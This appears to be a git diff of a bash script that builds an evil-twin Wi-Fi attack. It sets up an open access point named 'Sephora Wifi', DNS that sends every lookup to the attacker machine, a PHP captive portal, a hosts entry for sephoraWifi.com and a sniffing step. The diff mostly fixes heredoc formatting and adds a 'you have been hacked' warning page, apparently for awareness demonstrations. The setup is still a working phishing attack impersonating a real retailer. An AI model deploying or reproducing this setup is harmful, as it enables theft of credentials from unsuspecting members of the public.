@@ -45,15 +45,15 @@ dnsmasq_configuration (){
     # 4 Configure dnsmasq (DHCP + DNS)
     echo "[+] Configuration dnsmasq..."
     cat > /etc/dnsmasq.conf <<EOL
-    interface=$WIFI_IFACE
-    listen-address=$WIFI_IP
-    bind-interfaces
-    address=/#/192.168.1.1
-    dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,$DHCP_LEASE_TIME
-    server=8.8.8.8
-    server=8.8.4.4
-    log-queries
-    log-dhcp
+interface=$WIFI_IFACE
+listen-address=$WIFI_IP
+bind-interfaces
+address=/#/192.168.1.1
+dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,$DHCP_LEASE_TIME
+server=8.8.8.8
+server=8.8.4.4
+log-queries
+log-dhcp
 EOL
     systemctl restart dnsmasq
 }
@@ -62,12 +62,12 @@ EOL
 hostapd_configuration () {
     echo "[+] Configuration hostapd..."
     cat > /etc/hostapd/hostapd.conf <<EOL
-    interface=$WIFI_IFACE
-    driver=nl80211
-    ssid=Sephora Wifi
-    hw_mode=g
-    channel=7
-    wpa=0
+interface=$WIFI_IFACE
+driver=nl80211
+ssid=Sephora Wifi
+hw_mode=g
+channel=7
+wpa=0
 EOL
     sed -i 's|^#DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
 }
@@ -134,14 +134,33 @@ set_captive_portal_php () {
     exec("sudo hostapd_cli deauthenticate $mac");
 
     // Afficher un message de confirmation
-    echo "<html><head><title>Connexion réussie</title></head><body>";
-    echo "<h2>Connexion réussie !</h2>";
-    echo "<h2>IP : {$ip}</h2>";
-    echo "<h2>MAC : {$mac}</h2>";
-    echo "<p>Vous êtes maintenant connecté à Internet.</p>";
-    echo "<script>setTimeout(function(){ window.location.href = 'http://sephora.com'; }, 3000);</script>";
-    echo "</body></html>";
-
+    echo "<!DOCTYPE html>";
+    echo "<html lang='fr'>";
+    echo "<head>";
+    echo "<meta charset='UTF-8'>";
+    echo "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
+    echo "<title>ATTENTION ! Sécurité Compromise</title>";
+    echo "<style>";
+    echo "body { background-color: black; color: red; font-family: Arial, sans-serif; text-align: center;";
+    echo "display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }";
+    echo ".container { max-width: 80%; padding: 20px; border: 2px solid red; border-radius: 10px; background-color: rgba(255, 0, 0, 0.1); }";
+    echo "h1 { font-size: 3em; }";
+    echo "p { font-size: 1.5em; margin-top: 20px; }";
+    echo ".redirect { font-size: 1.2em; color: white; margin-top: 30px; }";
+    echo "</style>";
+    echo "</head>";
+    echo "<body>";
+    echo "<div class='container'>";
+    echo "<h1>⚠ ATTENTION ! ⚠</h1>";
+    echo "<p>Vous avez été piratés ! Faites attention aux identifiants que vous entrez sur Internet, cela peut vous porter préjudice.</p>";
+    echo "<p class='redirect'>Vous allez être redirigé vers le site de Sephora...</p>";
+    echo "</div>";
+    echo "<script>";
+    echo "setTimeout(function() { window.location.href = 'https://www.sephora.fr/'; }, 5000);";
+    echo "</script>";
+    echo "</body>";
+    echo "</html>";
+    exit();
     exit();
     ?>
 EOF
@@ -223,16 +242,18 @@ EOF
 }
 
 set_hosts () {
-    cat <<EOF > /etc/hosts
-    127.0.0.1       localhost
-    127.0.1.1       kali
-    192.168.1.1   sephoraWifi.com
 
-    # The following lines are desirable for IPv6 capable hosts
-    ::1     localhost ip6-localhost ip6-loopback
-    ff02::1 ip6-allnodes
-    ff02::2 ip6-allrouters
-EOF  
+    cat <<EOF > /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+192.168.1.1   sephoraWifi.com
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+EOF
+
 }
 
 big_restart () {
@@ -274,4 +295,4 @@ main () {
     snif_snif
 }
 
-                                       
+main
